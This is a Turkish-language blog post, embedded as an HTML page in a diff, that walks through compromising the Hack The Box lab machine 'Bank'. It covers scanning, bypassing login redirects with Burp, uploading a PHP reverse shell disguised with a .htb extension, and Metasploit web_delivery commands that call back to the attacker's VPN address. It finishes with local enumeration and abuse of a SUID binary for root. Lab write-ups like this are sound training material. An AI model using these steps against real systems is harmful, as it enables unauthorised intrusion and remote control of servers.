@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Hack-The-Box Bank</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hack-The-Box Bank | 4AllUsers</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Hack-The-Box Bank" />
+<meta name="author" content="Tuğcan Özel" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Siber Güvenlik Bloğu,Hack The Box ve makina çözümleri, yazılar ve diğer şeyler" />
+<meta property="og:description" content="Siber Güvenlik Bloğu,Hack The Box ve makina çözümleri, yazılar ve diğer şeyler" />
+<link rel="canonical" href="http://localhost:4000/machines/bank/" />
+<meta property="og:url" content="http://localhost:4000/machines/bank/" />
+<meta property="og:site_name" content="4AllUsers" />
+<meta property="og:image" content="http://localhost:4000/assets/hackthebox/Bank/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-08-06T00:00:00+03:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","image":"http://localhost:4000/assets/hackthebox/Bank/0.png","url":"http://localhost:4000/machines/bank/","headline":"Hack-The-Box Bank","dateModified":"2019-08-06T00:00:00+03:00","datePublished":"2019-08-06T00:00:00+03:00","description":"Siber Güvenlik Bloğu,Hack The Box ve makina çözümleri, yazılar ve diğer şeyler","author":{"@type":"Person","name":"Tuğcan Özel"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/machines/bank/"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>4allusers@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/categories"><h2 class="header-link">Categories</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Hack-The-Box Bank</h2>
+  <time datetime="2019-08-06T00:00:00+03:00" class="by-line">06 Aug 2019</time>
+  <p><img src="/assets/hackthebox/Bank/0.png" /> <!-- burayi img tagiyla yapicaksin --></p>
+
+<p>Merhaba arkadaşlar, bugün size hack the box makinasi olan Bank’i nasil çözdüğümü anlatmaya çalışıcam.Harbi güzel makinaydı, çözümü birkaç nokta hariç diğer klasikleşmiş makinalarla aynıydı.Makinamız linux makinasıydı ve ip si 10.10.10.29.Hazırsak baslayalım.</p>
+<hr />
+
+<h3 id="server-enumeration">Server Enumeration</h3>
+<p>Ilk olarak tabikide server enumeration icin Nmap taramamizi gerceklestiriyoruz.</p>
+
+<p><img src="/assets/hackthebox/Bank/1.png" alt="" /></p>
+
+<p>Bakiyorum ki 3 tane acik port 22/SSH 53 DNS ve 80 http her zaman oldugu gibi ilk hedef secilen port kardesimiz http oluyor ve browsera ip yi yazarak http istegi yapiyorum fakat karsima apache sayfasi geliyor buraya content discovery denemeden once dns portunun acik oldugu aklima geliyor ve hemen etc/hosts kismina ipmizi giriyoruz ve bilmiyorsaniz bilmenizde fayda var hacktheboxtaki domain isimleri labismi.htb diye devam eder bu yuzden hosts dosyamizada boyle ekliyoruz.Bunu yazinca karsimiza login.php sayfasi geldi ve submit query diyor allah allah.Bir dedim gobuster atayim ne var ne yok hayirdir yaniii!</p>
+
+<p><img src="/assets/hackthebox/Bank/2.png" alt="" /></p>
+<hr />
+<h3 id="http">HTTP</h3>
+
+<p>Web sayfasina islem yapmadan once aklimda kalmasin diye nmaptan gelen ciktilardaki portlardaki calisan servislerde bir zafiyet var mi diye hem searchsploit ile hemde google aramalari ile bakindim fakat yoktu simdi donelim httpmize</p>
+
+<p>bank.htb seklinde browsera yazdigimizda, karsimiza su sekilde bir sayfa geliyor, bu arada robots.txt dizini denedim herhangi bir sey gelmedi.</p>
+
+<p><img src="/assets/hackthebox/Bank/3.png" alt="" /></p>
+
+<h4 id="content-discovery">Content Discovery</h4>
+
+<p><code class="highlighter-rouge">gobuster dir -x php -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code> olarak bombardina basliyoruz.Bu gobusterin update li hali eski halinde dir olmadan direk yazarak kullanabilirsiniz.</p>
+
+<p>Bu sirada gobuster ararken bizde bir burple araya girelim bakalim ne var ne yok derken…Karsimiz asagidaki gibi cikti geliyor shiiiiiiit.</p>
+
+<p><img src="/assets/hackthebox/Bank/4.png" alt="" /></p>
+
+<p>Uploads dizinine gordukten sonra kafamda su olustu bak beni dinle.</p>
+
+<p>Dedim ben bir giris yapsam giris yaptiktan sonra bir reverse shell upload etsem netcatle dinlesem sonra booom icerideyim anniyomusun yani.</p>
+
+<p>Ama ole gelmedi annatabiliyommu yani baktim support.php ve index.php var http istegi gonderiyorum arada burp ile response kisminda html sayfasini goruyorum lakin beni login.php sayfasina yonlendiriyor.</p>
+
+<p><img src="/assets/hackthebox/Bank/5.png" alt="" /></p>
+
+<p>Dusundumki onumuzde login sayfasi var buraya bruteforce yapmak aklima gelen ilk seydi ki default credentialslari denemistim admin-password admin-bank gibi fakat username degil email-password istiyordu e bruteforce elendi sayfanin kaynak koduna baktim ordada ipucu yok geriye kalan tek sey php uzantili buldugumuz dosyalara bir bakmamiz lazim.</p>
+
+<p>Sonra ben internete baktim dedim redirect olmadan renderli bir sekilde gorebilir miyim sayfalari fakat
+sonra open link directly(no redirect diye bir firefox addonsu buldum) Ben firefox kullaniyorum bu arada fakat hic bisi anlamadim nasil kullanildigini sildim.</p>
+
+<p>Sonra dedimki olm napiosun bende burp proxy var dedim ben responselarida burp le keseyim ordan bir location headeri silelim bakalim noluo
+hoooop dusundugum gibi oldu support.php geldi ve gene dusundugumuz oldu dosya upload yeri geldi.</p>
+
+<p><img src="/assets/hackthebox/Bank/6.png" alt="" /></p>
+
+<p>php tabanli bir yerde calistigimiz icin php reverse shell denemek istedim.Kullandigim php-reverse-shelli burdan bulabilirsiniz.<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentestmonkey</a> sitesinde guzel kaynaklar ve shellllllller bulabilirsiniz kendisi yararli bir site.</p>
+
+<p>Post ettikten sonra gene redirect vardi bu yuzden gene location headerini sildim bana donene cevap ise kardesim sadece image yukleyebiliyoruz olarak geldi.Dedim bir deneyelim content-type headeri ile oynayalim uzantiyi png.php olarak degistirelim gorelim seklini semalini fakat yemedi izin vermedi.Sonra bir baktimki dikkatsiz davranmisim redirect yaparken html icinde soyle bir yazi vardi.</p>
+
+<p><code class="highlighter-rouge">[DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]</code></p>
+
+<p><img src="/assets/hackthebox/Bank/7.png" alt="" /></p>
+
+<hr />
+<h3 id="exploit">Exploit</h3>
+
+<p>Sitenin kaynak kodundaki ipucudan sonra .htb uzantisinda php-reverse-shell dosyamizi yukledikten sonra /uploads dizininden dosyaya istek gonderip shellin istek yollayacagi portu dinliyoruz ve booooooom! shellimiz geldi</p>
+
+<p><img src="/assets/hackthebox/Bank/8.png" alt="" /></p>
+
+<p>Simdi hak yukseltmemiz gerek fakat bundan once eger oluyorsa benim hep arzu ettigim shelli meterpretere tasimak her turlu daha kolay ve esnek olmakta.Bu yuzden, post exploitten once shelli meterpretere tasiyalim.</p>
+
+<p>Metasploiti actiktan sonra sirasiyla sunlari giriyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; use exploit/multi/script/web_delivery
+&gt; set target 1
+&gt; set lhost vpn-ipniz(tun0)
+&gt; set set payload php/meterpreter/reverse_tcp
+&gt; exploit
+</code></pre></div></div>
+<p>Dedikten sonra size verilen php payloadini netcat ile aldiginiz shellde calistirirsaniz meterpreterda onunuze session olarak dusecektir.</p>
+
+<p><img src="/assets/hackthebox/Bank/9.png" alt="" /></p>
+
+<hr />
+<h3 id="post-exploitation">Post-Exploitation</h3>
+
+<p>Simdi hak yukseltmemiz lazim, isleme baslamadan once size hep yaninizda bulunmasi acisindan soyle bir site birakiyorum.Cok yararli kendisi!Ozellikle privilege escalation cheat sheeti icin kullaniyorum.</p>
+
+<ul>
+  <li><a href="https://blackwintersecurity.com/">blackwintersecurity</a></li>
+</ul>
+
+<p>cat /proc/version dedikten sonra gelen kernel versionu Linux version 4.4.0-79-generic.Exploit-db de kendisi hakkinda exploitler vardi fakat meterpreter ile upload edip calistirdiktan sonra error veriodu o yuzden denemeyi kestim.</p>
+
+<p>Meterpreter shellini aldiktan sonra meterpreterin upload fonksiyonunu kullanarak karsi servera dosya yukluyoruz fakat karsidaki istedigim her yere dosya yukleyemeyiz bunun icin belirli dizinler var.Bunlar listesi tarzi bir sey icin size su linki birakmak isterim <a href="&quot;https://wiki.archlinux.org/index.php/Tmpfs&quot;">tmpfs</a>.Acilimi gecici dosya sistemi olarak gecmekte ve bunun icinde belli dizinler var.Mesela /tmp yada /dev/shm gibi buralar paylasima acik dizinler oldugu icin dosyamizi buraya yukleyerek burdan calistirabilmekteyiz, daha fazlasi icin linke bakabilirsiniz.</p>
+
+<p>Asagidaki resimde de gorebileceginiz uzere LinEnum.sh olarak gecen bir bash scriptimiz var.Linux isletim sistemlerinde privelege escalation islemini gerceklestirebilmek icin hazirlanan araclar arasindan en iyisi ve en cok kullanilani, size gerekli olan ne varsa getirebilmekte.Dosyamizi yukledikten sonra <code class="highlighter-rouge">shell</code> yazarak shellimize geciyoruz ve daha sonra calistirma haklari icin <code class="highlighter-rouge">chmod</code> komutunu kullaniyoruz ve her sey hazir olduktan sonrada komutumuzu calistiriyoruz.</p>
+
+<p><img src="/assets/hackthebox/Bank/10.png" alt="" /></p>
+
+<p>Onumuze hak yukseltmeye calistigimiz linux isletim sistemi hakkinda cok fazla bilgi gelmekte fakat ben size su anda bizim isimize yarayan yere dikkat cekmek isticem.</p>
+
+<p><img src="/assets/hackthebox/Bank/11.png" alt="" /></p>
+
+<p>Resimdede goruldugu gibi /var/htb/bin/emergency olarak gordugumuz dizin bir suid bitine sahip calistirabilir dosya.Zaten bunu gordukten sonra yakaladigimi hissetmistim bakalim root olicikmiyiz.</p>
+
+<p><img src="/assets/hackthebox/Bank/12.png" alt="" /></p>
+
+<p>Evet, goruldugu gibi makinamiz bitmistir.Sagolun tesekkurler.</p>
+
+</article>
+
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>4AllUsers</b>
+    </span>
+    
+    <span>© 2019</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
